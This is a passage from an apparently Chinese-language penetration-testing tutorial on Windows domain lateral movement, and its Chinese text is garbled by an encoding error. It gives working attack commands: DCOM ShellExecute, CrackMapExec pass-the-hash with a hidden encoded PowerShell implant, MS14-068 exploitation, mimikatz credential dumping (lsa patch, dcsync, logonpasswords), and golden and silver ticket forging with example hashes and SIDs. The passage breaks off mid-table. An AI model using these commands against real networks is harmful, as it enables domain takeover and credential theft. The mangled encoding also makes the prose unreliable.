<li>Ë∞ÉÁî®<code>9BA05972-F6A8-11CF-A442-00A0C90A8F39</code></li>
</ul>
<blockquote>
<p>$com = [Type]::GetTypeFromCLSID(‚Äò9BA05972-F6A8-11CF-A442-00A0C90A8F39‚Äô, ‚Äúip‚Äù)<br>$obj = [System.Activator]::CreateInstance($com)<br>$item = $obj.item()<br>$item.Document.Application.ShellExecute(‚Äúcmd.exe‚Äù,‚Äù/c calc.exe‚Äù, ‚Äúc:\windows\system32‚Äù,$null,0)</p>
</blockquote>
<ol start="7">
<li><strong>ÊâπÈáèÁßªÂä®</strong></li>
</ol>
<p>CrackMapExecÈõÜÊàê‰∫Üwmiexec„ÄÅatexe„ÄÅsmbexecÔºåÈõÜÊàê‰∫ÜsmbÊâ´Êèè,Âè£‰ª§ÁàÜÁ†¥Á≠âÂäüËÉΩ,ÈùûÂ∏∏ÈÄÇÂêàÊãøÊù•Âø´ÈÄüÁßªÂä®</p>
<p>ÂÖ∂‰∏≠ÔºåÊâπÈáè‰º†ÈÄíhashÔºö(88,90Â§ö‰∏™ÁõÆÊ†á‰ΩøÁî®Áõ∏Âêåhash‰º†ÈÄí)</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de<br><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de  -x <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>

<p>ÈÖçÂêàcs‰∏äÈ©¨</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.211.55.51</span>  <span class="hljs-number">10.211.55.52</span> -u administrator  -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de -x <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><h3 id="KerberosÂçèËÆÆËÆ§ËØÅËøáÁ®ã"><a href="#KerberosÂçèËÆÆËÆ§ËØÅËøáÁ®ã" class="headerlink" title="KerberosÂçèËÆÆËÆ§ËØÅËøáÁ®ã"></a>KerberosÂçèËÆÆËÆ§ËØÅËøáÁ®ã</h3><p>KerberosÂçèËÆÆÊòØ‰∏ÄÁßçÂü∫‰∫éÁ¨¨‰∏âÊñπÂèØ‰ø°‰∏ªÊú∫ÁöÑËÆ°ÁÆóÊú∫ÁΩëÁªúÂçèËÆÆÔºåÁî®Êù•Âú®ÈùûÂÆâÂÖ®ÁΩëÁªú‰∏≠ÔºåÂØπ‰∏™‰∫∫ÈÄö‰ø°‰ª•ÂÆâÂÖ®ÁöÑÊâãÊÆµËøõË°åË∫´‰ªΩËÆ§ËØÅ„ÄÇKerberosÂçèËÆÆÂú®Âú®ÂÜÖÁΩëÂüüÊ∏óÈÄè‰∏≠Ëá≥ÂÖ≥ÈáçË¶ÅÔºåÁôΩÈì∂Á•®ÊçÆ„ÄÅÈªÑÈáëÁ•®ÊçÆ„ÄÅÊîªÂáªÂüüÊéßÁ≠âÈÉΩÁ¶ª‰∏çÂºÄkerberosÂçèËÆÆ„ÄÇ</p>
<p><strong>ÂÖ≥ÈîÆËßíËâ≤Ôºö</strong></p>
<ul>
<li><strong>Domain Controller (ÂüüÊéßÂà∂Âô®)ÔºåÁÆÄÁß∞DCÔºå‰∏ÄÂè∞ËÆ°ÁÆóÊú∫ÔºåÂÆûÁé∞Áî®Êà∑„ÄÅËÆ°ÁÆóÊú∫ÁöÑÁªü‰∏ÄÁÆ°ÁêÜ„ÄÇ</strong></li>
<li><strong>Key Distribution Center(ÁßòÈí•ÂàÜÂèë‰∏≠ÂøÉ)ÔºåÁÆÄÁß∞KDCÔºåÈªòËÆ§ÂÆâË£ÖÂú®ÂüüÊéßÈáåÔºåÂåÖÊã¨ASÂíåTGS„ÄÇ</strong> </li>
<li><strong>Authentication Service(Ë∫´‰ªΩÈ™åËØÅÊúçÂä°)ÔºåÁÆÄÁß∞ASÔºåÁî®‰∫éKDCÂØπClientËÆ§ËØÅ„ÄÇ</strong> </li>
<li><strong>Ticket Grantng Service (Á•®ÊçÆÊéà‰∫àÊúçÂä°)ÔºåÁÆÄÁß∞TGSÔºåÁî®‰∫éKDCÂêëClientÂíåServerÂàÜÂèëSession KeyÔºà‰∏¥Êó∂keyÔºâ„ÄÇ</strong> </li>
<li><strong>Active Directory(Ê¥ªÂä®ÁõÆÂΩï)ÔºåÁÆÄÁß∞ADÔºåÁî®‰∫éÂ≠òÂÇ®Áî®Êà∑„ÄÅÁî®Êà∑ÁªÑ„ÄÅÂüüÁõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØ„ÄÇ</strong> </li>
<li><strong>Client ÂÆ¢Êà∑Á´ØÔºåÊåáÁî®Êà∑„ÄÇ</strong> </li>
<li><strong>Server ÊúçÂä°Á´ØÔºåÂèØËÉΩÊòØÊüêÂè∞ËÆ°ÁÆóÊú∫Ôºå‰πüÂèØËÉΩÊòØÊüê‰∏™ÊúçÂä°„ÄÇ</strong></li>
</ul>
<p>Êâì‰∏™ÊØîÊñπÔºöÂΩìwhoamiË¶ÅÂíåbunnyËøõË°åÈÄö‰ø°ÁöÑÊó∂ÂÄôÔºåwhoamiÂ∞±ÈúÄË¶ÅÂêëbunnyËØÅÊòéËá™Â∑±ÊòØwhoamiÔºåÁõ¥Êé•ÁöÑÊñπÂºèÂ∞±ÊòØwhoamiÁî®‰∫å‰∫∫‰πãÈó¥ÁöÑÁßòÂØÜÂÅöÁßòÈí•Âä†ÂØÜÊòéÊñáÊñáÂ≠óÁîüÊàêÂØÜÊñáÔºåÊääÂØÜÊñáÂíåÊòéÊñáÊñáÂ≠ó‰∏ÄÂùóÂèëÈÄÅÁªôbunnyÔºåbunnyÂÜçÁî®ÁßòÂØÜËß£ÂØÜÂæóÂà∞ÊòéÊñáÔºåÊääÊòéÊñáÂíåÊòéÊñáÊñáÂ≠óËøõË°åÂØπÊØîÔºåËã•‰∏ÄËá¥ÔºåÂàôËØÅÊòéÊòØwhoami„ÄÇ</p>
<p>‰ΩÜÊòØÁΩëÁªú‰∏≠ÔºåÂØÜÊñáÂíåÊñáÂ≠óÂæàÊúâÂèØËÉΩË¢´Á™ÉÂèñÔºåÂπ∂‰∏îÂè™Ë¶ÅÊó∂Èó¥Ë∂≥Â§üÔºåÊÄªËÉΩÁ†¥Ëß£ÂæóÂà∞ÁßòÈí•„ÄÇÊâÄ‰ª•‰∏çËÉΩ‰ΩøÁî®ËøôÁßçÈïøÊúüÊúâÊïàÁöÑÁßòÈí•ÔºåË¶ÅÊîπ‰∏∫Áü≠ÊúüÁöÑ‰∏¥Êó∂ÁßòÈí•„ÄÇÈÇ£‰πàËøô‰∏™‰∏¥Êó∂ÁßòÈí•Â∞±ÈúÄË¶Å‰∏Ä‰∏™Á¨¨‰∏âÊñπÂèØ‰ø°‰ªªÁöÑÊú∫ÊûÑÊù•Êèê‰æõÔºåÂç≥KDCÔºàKey Distribution CenterÔºâ„ÄÇ</p>
<p>‰∏ãÈù¢ËÆ≤‰∏Ä‰∏ãËØ¶ÁªÜÁöÑËÆ§ËØÅÊ≠•È™§ÔºåÂ§ßÊ¶ÇÂàÜ‰∏∫‰∏â‰∏™Èò∂ÊÆµÔºö</p>
<p><strong>AS-REQ‚ÄîAS-REPÈò∂ÊÆµÔºö</strong></p>
<p>È¶ñÂÖàClientÁî®Ëá™Â∑±ÁöÑÂìàÂ∏åÂÄºNTLM-hashÂØπtimestamp„ÄÅclient-info„ÄÅserver-infoÁ≠âÊï∞ÊçÆËøõË°åÂä†ÂØÜÔºåÂèëÈÄÅÁªôASÔºåÂêëASËØ∑Ê±ÇTGTÁ•®ÊçÆ„ÄÇÔºà<strong>AS-REQ</strong>Ôºâ</p>
<p>ÂΩìASÊî∂Âà∞ClientÂèëÊù•ÁöÑ‰ø°ÊÅØÂêéÔºåAS‰ºöÂÖàÂêëÂüüÊéßADËØ∑Ê±ÇÔºåËØ¢ÈóÆÊòØÂê¶ÊúâÊ≠§ClientÁî®Êà∑ÔºåÂ¶ÇÊûúÊúâÁöÑËØùÔºåÂ∞±‰ºöÂèñÂá∫ËØ•ClientÁöÑNTLM hashÔºåÁÑ∂ÂêéÁîüÊàê‰∏Ä‰∏™ÈöèÊú∫ÁßòÈí•Áß∞‰∏∫Session-Key asÔºà‰∏¥Êó∂ÁßòÈí•Session-KeyÔºâ„ÄÇÂπ∂‰ΩøÁî®Client NTLM-hash Âä†ÂØÜ Session-key as ‰Ωú‰∏∫‰∏ÄÈÉ®ÂàÜÂÜÖÂÆπ„ÄÇ</p>
<p>ËøòÊúâ‰∏ÄÈÉ®ÂàÜÂÜÖÂÆπÂ∞±ÊòØTGTÔºö‰ΩøÁî®KDC‰∏Ä‰∏™ÁâπÂÆöË¥¶Êà∑krbtgtÁöÑNTLM-hashÂØπSession-key as„ÄÅtimestamp„ÄÅClient-infoËøõË°åÁöÑÂä†ÂØÜ„ÄÇÁÑ∂ÂêéÂ∞ÜËøô‰∏§ÈÉ®ÂàÜÂõûÂ§çÁªôClient„ÄÇÔºà<strong>AS-REP</strong>Ôºâ</p>
<p>ËØ•Èò∂ÊÆµÊòØClientÂíåASÁöÑËÆ§ËØÅ„ÄÇ</p>
<p><strong>TGS-REQ‚ÄîTGS-REPÈò∂ÊÆµÔºö</strong></p>
<p>Client Êî∂Âà∞ASÂèëÊù•ÁöÑAS-REPÂêéÔºåÂÖà‰ΩøÁî®Ëá™Ë∫´ÁöÑ NTLM Hash Ëß£ÂØÜÂæóÂà∞ Session-key asÔºåÁÑ∂Âêé‰ΩøÁî® Session-key as ÂØπ Client-Info„ÄÅtimestamp„ÄÅServer-Info Âä†ÂØÜ‰Ωú‰∏∫‰∏ÄÈÉ®ÂàÜÔºåÂä†‰∏äTGT Ôºå‰∏ÄÂπ∂ÂèëÈÄÅÁªô KDC‰∏≠ÁöÑ TGS„ÄÇÔºà<strong>TGS-REQ</strong>Ôºâ</p>
<p>TGS Êî∂Âà∞ËØ∑Ê±ÇÂêéÔºå‰ΩøÁî® krbtgt ÁöÑ NTLM Hash Ëß£ÂØÜ TGTÔºåÂæóÂà∞ Session-key  as„ÄÅtimestamp„ÄÅClient-infoÔºåÂêåÊó∂Ôºå‰ΩøÁî® TGT Ëß£ÂØÜÂá∫ÁöÑ Session-key as  Ëß£ÂØÜÁ¨¨‰∏ÄÈÉ®ÂàÜÂÜÖÂÆπÔºåÂæóÂà∞Client-info„ÄÅtimestamp„ÄÇ  ÊØîÂØπËøô‰∏§ÈÉ®ÂàÜËß£ÂØÜÂæóÂà∞ÁöÑÂÜÖÂÆπ‰ª•È™åËØÅÊòØÂê¶ÈÄöËøá„ÄÇÈÄöËøáÂêéÔºåÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑÈöèÊú∫ÁßòÈí•(Session-Key tgs)ÔºåÂπ∂ÂêëClientÂõûÂ§ç<strong>TGS-REPÁöÑ</strong>‰∏§ÈÉ®ÂàÜÂÜÖÂÆπÔºö</p>
<ol>
<li>‰∏ÄÈÉ®ÂàÜÊòØSession-key as Âä†ÂØÜÁöÑ Session-key tgs</li>
<li>Âè¶‰∏ÄÈÉ®ÂàÜÊòØST(ticket)ÔºåÂç≥Server NTLM-hashÂä†ÂØÜÁöÑÊï∞ÊçÆ(Session-key tgs„ÄÅtimestamp„ÄÅClient-info)</li>
</ol>
<p>ËØ•Èò∂ÊÆµÊòØClientÂíåKDCÁöÑÈÄö‰ø°„ÄÇ</p>
<p><strong>AP-REQ‚ÄîAP-REPÈò∂ÊÆµÔºö</strong></p>
<p>ClientÊî∂Âà∞<strong>TGS-REPÂêé</strong>ÔºåÂÖàÁî®Ëá™Â∑±‰øùÂ≠òÁöÑSession-key asËß£ÂØÜÂá∫‰∫ÜSession-key tgs„ÄÇÂÜç‰ΩøÁî®Session-key tgsÂä†ÂØÜClient-info„ÄÅtimestamp‰Ωú‰∏∫‰∏ÄÈÉ®ÂàÜÂÜÖÂÆπÔºåÂè¶‰∏ÄÈÉ®ÂàÜÊòØSTÔºå‰∏ÄÂπ∂ÂèëÈÄÅÁªôServer„ÄÇÔºà<strong>AP-REQ</strong>Ôºâ</p>
<p>Server Êî∂Âà∞ClientÂèëÊù•ÁöÑ<strong>AP-REQ</strong>ÂêéÔºåÁî®Ëá™Ë∫´ÁöÑNTLM HashËß£ÂØÜ‰∫ÜSTÔºåÂæóÂà∞Session-key tgsÔºåÂÜçÁî®Session-key  tgsËß£ÂØÜÁ¨¨‰∏ÄÈÉ®ÂàÜÂæóÂà∞Client-info„ÄÅtimestamp„ÄÇÁÑ∂Âêé‰∏éSTÁöÑClient-info„ÄÅtimestampËøõË°åÂØπÊØî„ÄÇtimestamp ‰∏ÄËà¨Êó∂Èó¥‰∏∫8Â∞èÊó∂„ÄÇÈ™åËØÅÈÄöËøáÂêéÔºåÂõûÂ§ç<strong>AP-REP</strong>ÔºåÊúÄÁªàÂª∫Á´ãÈÄö‰ø°„ÄÇ</p>
<p>‰∏äÈù¢ÁöÑPTHÊîªÂáªÔºåÈúÄË¶ÅËé∑ÂèñÂà∞NTLMÔºåÂøÖÈ°ªË¶ÅËé∑ÂæóÁõÆÊ†áÁöÑÁÆ°ÁêÜÂëòÊùÉÈôêÔºåÂ¶ÇÊûúÊ≤°ÊúâÁÆ°ÁêÜÂëòÊùÉÈôê‰∏ãÔºåË¶Å‰πàÊèêÊùÉÔºåË¶Å‰πàÂèØ‰ª•ËØï‰∏ÄËØïPTT</p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>PACÊòØÁî®Êù•È™åËØÅClientÁöÑËÆøÈóÆÊùÉÈôêÁöÑÔºåÂÆÉ‰ºöË¢´ÊîæÂú®TGTÈáåÂèëÈÄÅÁªôClientÔºåÁÑ∂ÂêéÁî±ClientÂèëÈÄÅÁªôTGS„ÄÇ</p>
<p>WindowsÂüü‰∏≠‰ΩøÁî®kerberosÂçèËÆÆËøáÁ®ã‰∏≠Ôºå‰∏∫‰∫ÜËÆ©ÊúçÂä°Âô®Âà§Êñ≠ClientÊòØÂê¶ÊúâÊùÉÈôêËÆøÈóÆÊúçÂä°ÔºåÂæÆËΩØÂú®WindowsÂπ≥Âè∞‰∏äÂØπKerberosÂçèËÆÆËøõË°å‰∫Ü‰∏Ä‰∫õÊâ©ÂÖÖÔºåÂç≥Âú®ÂçèËÆÆ‰∏≠Â¢ûÂä†‰∫ÜPACÔºàPrivilege Attribute CertificateÔºâÔºåÁâπÊùÉÂ±ûÊÄßËØÅ‰π¶Ôºå‰πüÂ∞±ÊòØËøô‰∏™PACÈÄ†Êàê‰∫ÜMS14-068Ëøô‰∏™ÊºèÊ¥û„ÄÇ</p>
<p>MS14-068ÊòØÂØÜÈí•ÂàÜÂèë‰∏≠ÂøÉÔºàKDCÔºâÊúçÂä°‰∏≠ÁöÑWindowsÊºèÊ¥û„ÄÇÂÆÉÂÖÅËÆ∏ÁªèËøáË∫´‰ªΩÈ™åËØÅÁöÑÁî®Êà∑Âú®ÂÖ∂KerberosÁ•®ËØÅÔºàTGTÔºâ‰∏≠<strong>ÊèíÂÖ•‰ªªÊÑèÁöÑPAC</strong>ÔºàË°®Á§∫ÊâÄÊúâÁî®Êà∑ÊùÉÈôêÁöÑÁªìÊûÑÔºâ„ÄÇËØ•ÊºèÊ¥û‰Ωç‰∫ékdcsvc.dllÂüüÊéßÂà∂Âô®ÁöÑÂØÜÈí•ÂàÜÂèë‰∏≠ÂøÉ(KDC)‰∏≠„ÄÇ<strong>ÊôÆÈÄöÁî®Êà∑ÂèØ‰ª•ÈÄöËøáÂëàÁé∞ÂÖ∑ÊúâÊîπÂèò‰∫ÜPACÁöÑKerberos TGTÊù•Ëé∑ÂæóÁ•®ËØÅÔºåËøõËÄå‰º™ÈÄ†Á•®ÊçÆËé∑ÂæóÁÆ°ÁêÜÂëòÊùÉÈôê„ÄÇ</strong></p>
<p><strong>Âà©Áî®Êù°‰ª∂Ôºö</strong></p>
<blockquote>
<p>Ëé∑Âèñ‰ªªÊÑèÁî®Êà∑SID</p>
<p>ÂüüÂÜÖ‰ªªÊÑèË¥¶Âè∑ÁöÑÂØÜÁ†Å</p>
</blockquote>
<p><strong>Âà©Áî®Ôºö</strong></p>
<p>ÊâæÂà©Áî®Â∑•ÂÖ∑Ôºö<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p>
<p>ÁîüÊàêTGT(ccache)</p>
<blockquote>
<p>MS14-068 -u <a href="mailto:&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#105;&#x6f;">&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#105;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p>
</blockquote>
<p>mimikatzÊ≥®ÂÖ•Á•®ÊçÆ</p>
<blockquote>
<p>kerberos::purge  //Ê∏ÖÁ©∫ÊâÄÊúâÂá≠ËØÅÔºåÊúâÂÖ∂‰ªñÂá≠ËØÅ‰ºöÂΩ±Âìç‰º™ÈÄ†</p>
<p>kerberos::list       //ÂàóÂá∫ÊâÄÊúâÂá≠ËØÅ</p>
<p>kerberos::ptc       //Ê≥®ÂÖ•Á•®ÊçÆ</p>
</blockquote>
<blockquote>
<p>net use \\DC        ‚Ä¶</p>
</blockquote>
<h3 id="ÈªÑÈáëÁ•®ÊçÆ-Golden-ticket"><a href="#ÈªÑÈáëÁ•®ÊçÆ-Golden-ticket" class="headerlink" title="ÈªÑÈáëÁ•®ÊçÆ(Golden ticket)"></a>ÈªÑÈáëÁ•®ÊçÆ(Golden ticket)</h3><p>Âú®WindowsÁöÑkerberosËÆ§ËØÅËøáÁ®ã‰∏≠ÔºåClientÂ∞ÜËá™Â∑±ÁöÑ‰ø°ÊÅØÂèëÈÄÅÁªôKDCÔºåÁÑ∂ÂêéKDC‰ΩøÁî®krbtgtÁî®Êà∑ÁöÑHash‰Ωú‰∏∫ÂØÜÈí•ËøõË°åÂä†ÂØÜÔºåÁîüÊàêTGT„ÄÇÈÇ£‰πàÂ¶ÇÊûúËé∑ÂèñÂà∞‰∫ÜkrbtgtÁöÑHashÂÄºÔºå‰∏çÂ∞±ÂèØ‰ª•‰º™ÈÄ†‰ªªÊÑèÁöÑtgt‰∫ÜÂêó„ÄÇ<strong>Âõ†‰∏∫krbtgtÂè™ÊúâÂüüÊéßÂà∂Âô®‰∏äÈù¢ÊâçÊúâÔºåÊâÄ‰ª•‰ΩøÁî®ÈªÑÈáëÂá≠ÊçÆÊÑèÂë≥ÁùÄ‰Ω†‰πãÂâçÊãøÂà∞ËøáÂüüÊéßÂà∂Âô®ÁöÑÊùÉÈôêÔºåÈªÑÈáëÂá≠ÊçÆÂèØ‰ª•ÁêÜËß£‰∏∫‰∏Ä‰∏™ÂêéÈó®„ÄÇ</strong></p>
<blockquote>
<p>ÂÖàÂÅáËÆæËøô‰πà‰∏ÄÁßçÊÉÖÂÜµÔºåÂéüÂÖàÂ∑≤ÊãøÂà∞ÁöÑÂüüÂÜÖÊâÄÊúâÁöÑË¥¶Êà∑HashÔºåÂåÖÊã¨krbtgtËøô‰∏™Ë¥¶Êà∑ÔºåÁî±‰∫éÊúâ‰∫õÂéüÂõ†ÂØºËá¥‰Ω†ÂØπÂüüÁÆ°ÊùÉÈôê‰∏¢Â§±Ôºå‰ΩÜÂ•ΩÂú®‰Ω†ËøòÊúâ‰∏Ä‰∏™ÊôÆÈÄöÂüüÁî®Êà∑ÊùÉÈôêÔºåÁ¢∞Â∑ßÁÆ°ÁêÜÂëòÂú®ÂüüÂÜÖÂä†Âõ∫Êó∂ÂøòËÆ∞ÈáçÁΩÆkrbtgtÂØÜÁ†ÅÔºåÂü∫‰∫éÊ≠§Êù°‰ª∂ÔºåÊàë‰ª¨ËøòËÉΩÂà©Áî®ËØ•Á•®ÊçÆÈáçÊñ∞Ëé∑ÂæóÂüüÁÆ°ÁêÜÂëòÊùÉÈôêÔºå<strong>Âà©Áî®krbtgtÁöÑHASHÂÄºÂèØ‰ª•‰º™ÈÄ†ÁîüÊàê‰ªªÊÑèÁöÑTGT(mimikatz)ÔºåËÉΩÂ§üÁªïËøáÂØπ‰ªªÊÑèÁî®Êà∑ÁöÑË¥¶Âè∑Á≠ñÁï•ÔºåËÆ©Áî®Êà∑Êàê‰∏∫‰ªªÊÑèÁªÑÁöÑÊàêÂëòÔºåÂèØÁî®‰∫éKerberosËÆ§ËØÅÁöÑ‰ªª‰ΩïÊúçÂä°</strong>„ÄÇ</p>
</blockquote>
<p>ÊîªÂáªËÄÖÂÜç‰ΩøÁî®ÈªÑÈáëÁ•®ÊçÆËøõË°åÁ•®ÊçÆ‰º†ÈÄíÊîªÂáªÊó∂ÔºåÈÄöÂ∏∏Ë¶ÅÊéåÊè°‰ª•‰∏ã‰ø°ÊÅØÔºö</p>
<ul>
<li>ÈúÄË¶Å‰º™ÈÄ†ÁöÑÂüüÁÆ°ÁêÜÂëòÁî®Êà∑Âêç</li>
<li>ÂÆåÊï¥ÁöÑÂüüÂêç</li>
<li>ÂüüSID</li>
<li>krbtgtÁöÑNTLM Hash</li>
</ul>
<p><strong>Âà©Áî®Ôºö</strong></p>
<p>ÁôªÂΩïÂüüÊéßÊäìÂèñkrbtgtÁî®Êà∑ÁöÑHashÂÄºÂπ∂Ëé∑ÂèñÂüüSID</p>
<p><strong>ÁªèÊµãËØïÔºåwin10/server2022ÊäìÂèñ‰ºöÂÖ≥Êú∫ÔºåÂ∑≤Âú®Ê≠§ËÆæÂ§á‰∏äÁ¶ÅÁî®ÂØπÂä®ÊÄÅËÆøÈóÆÊéßÂà∂ÁöÑKerberos ÊîØÊåÅ</strong></p>
<blockquote>
<p>privilege::debug</p>
<p>lsadump::lsa /patch        // ‰∏ìÁî®‰∫éÂú®ÂüüÊéßÂà∂Âô®‰∏äÂØºÂá∫Áî®Êà∑ÂØÜÁ†ÅÊàñhash</p>
<p>ÊàñËÄÖÔºö</p>
<p>lsadump::dcsync /domain:QWE.io /user:krbtgt  //ÂèñÂæóÁöÑsidÂÄºÂêéÈù¢‰∏â‰ΩçÂéªÈô§</p>
</blockquote>
<ul>
<li>ÁîüÊàêÁ•®ÊçÆÂêéÊ≥®ÂÖ•</li>
</ul>
<p>ÁÑ∂ÂêéÂú®ÊôÆÈÄöÂüüÁî®Êà∑Êú∫Âô®ÔºåÁî®mimikatzÁîüÊàêÂêç‰∏∫ticket.kirbiÁöÑTGTÂá≠ËØÅÔºåÁî®Êà∑Âêç‰∏∫Administrator </p>
<blockquote>
<p>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</p>
</blockquote>
<p>Ê≥®ÂÖ•TGTÁ•®ÊçÆ</p>
<blockquote>
<p>kerberos::ptt ticket.kirbi</p>
</blockquote>
<p>Êü•Áúãtgt</p>
<blockquote>
<p>kerberos::tgt</p>
</blockquote>
<blockquote>
<p>net use \\DC        ‚Ä¶</p>
</blockquote>
<ul>
<li>ÁîüÊàêÂπ∂Áõ¥Êé•ÂØºÂÖ•</li>
</ul>
<blockquote>
<p>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt  //ÁîüÊàêÁ•®ÊçÆÂπ∂ÂØºÂÖ•</p>
<p>ÊàñËÄÖ‰πüÂèØ‰ª•‰ΩøÁî®krbtgtÁöÑAES-256<br>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt</p>
</blockquote>
<h3 id="ÁôΩÈì∂Á•®ÊçÆ-Silver-ticket"><a href="#ÁôΩÈì∂Á•®ÊçÆ-Silver-ticket" class="headerlink" title="ÁôΩÈì∂Á•®ÊçÆ(Silver ticket)"></a>ÁôΩÈì∂Á•®ÊçÆ(Silver ticket)</h3><p>ÁôΩÈì∂Á•®ÊçÆ‰∏çÂêå‰∫éÈªÑÈáëÁ•®ÊçÆÔºåÁôΩÈì∂Á•®ÊçÆÁöÑÂà©Áî®ËøáÁ®ãÊòØ‰º™ÈÄ†TGSÔºåÈÄöËøáÂ∑≤Áü•ÁöÑÊéàÊùÉÊúçÂä°ÂØÜÁ†ÅÁîüÊàê‰∏ÄÂº†ÂèØ‰ª•ËÆøÈóÆËØ•ÊúçÂä°ÁöÑTGT„ÄÇÂõ†‰∏∫Âú®Á•®ÊçÆÁîüÊàêËøáÁ®ã‰∏≠‰∏çÈúÄË¶Å‰ΩøÁî®KDCÔºåÊâÄ‰ª•ÂèØ‰ª•ÁªïËøáÂüüÊéßÂà∂Âô®ÔºåÂæàÂ∞ëÁïô‰∏ãÊó•Âøó„ÄÇËÄåÈªÑÈáëÁ•®ÊçÆÂú®Âà©Áî®ËøáÁ®ã‰∏≠Áî±KDCÈ¢ÅÂèëTGTÔºåÂπ∂‰∏îÂú®ÁîüÊàê‰º™ÈÄ†ÁöÑTGTÂæó20ÂàÜÈíüÂÜÖÔºåTGS‰∏ç‰ºöÂØπËØ•TGTÁöÑÁúü‰º™ËøõË°åÊïàÈ™å„ÄÇ</p>
<p>ÁôΩÈì∂Á•®ÊçÆ‰æùËµñ‰∫éÊúçÂä°Ë¥¶Âè∑ÁöÑÂØÜÁ†ÅÊï£ÂàóÂÄºÔºåËøô‰∏çÂêå‰∫éÈªÑÈáëÁ•®ÊçÆÂà©Áî®ÈúÄË¶Å‰ΩøÁî®krbtgtË¥¶Âè∑ÁöÑÂØÜÁ†ÅÂìàÂ∏åÂÄºÔºåÂõ†Ê≠§Êõ¥Âä†ÈöêËîΩ„ÄÇ</p>
<p>ÊîªÂáªËÄÖË¶ÅÂà©Áî®ÁôΩÈì∂Á•®ÊçÆËøõË°åÁ•®ÊçÆ‰º†ÈÄíÊîªÂáªÔºåÈúÄË¶ÅÊéåÊè°‰∏ãÈù¢Âá†‰∏™‰ø°ÊÅØÔºö</p>
<ul>
<li>ÂüüÂêç</li>
<li>ÂüüSID</li>
<li>ÁõÆÊ†áÊúçÂä°Âô®ÁöÑFQDN</li>
<li>ÂèØÂà©Áî®ÁöÑÊúçÂä°</li>
<li>ÊúçÂä°Ë¥¶Âè∑ÁöÑNTLM Hash</li>
<li>Ë¶Å‰º™ÈÄ†ÁöÑÁî®Êà∑Âêç</li>
</ul>
<p><strong>Âà©Áî®Ôºö</strong></p>
<p>ÁôªÂΩïÂüüÊéßÔºåÊäìÂèñÂÖ±‰∫´ÊúçÂä°Ë¥¶Âè∑hash</p>
<blockquote>
<p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p>
</blockquote>
<p>Âú®ÊôÆÈÄöÂüüÁî®Êà∑‰∏≠ÔºåÁîüÊàêÁôΩÈì∂Á•®ÊçÆ</p>
<blockquote>
<p>kerberos::golden /domain:QWE.io /sid:SID /target:DC.QWE.io /rc4:hash /service:cifs /user:admin /ptt</p>
</blockquote>
<p>ÂÖ∂‰∏≠</p>
<blockquote>
<p>/service:ÁõÆÊ†áÊúçÂä°Âô®‰∏äÈù¢ÁöÑkerberosÊúçÂä°ÔºåÊ≠§Â§Ñ‰∏∫cifs</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">ÊúçÂä°ÂêçÁß∞                    ÂêåÊó∂ÈúÄË¶ÅÁöÑÊúçÂä°<br><span class="hljs-variable">WMI</span>                        <span class="hljs-variable">HOST</span>„ÄÅ<span class="hljs-variable">RPCSS</span><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>        <span class="hljs-variable">HOST</span>„ÄÅ<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">WinRM</span>                      <span class="hljs-variable">HOST</span>„ÄÅ<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>            <span class="hljs-variable">HOST</span><br><span class="hljs-variable">Windows</span> <span 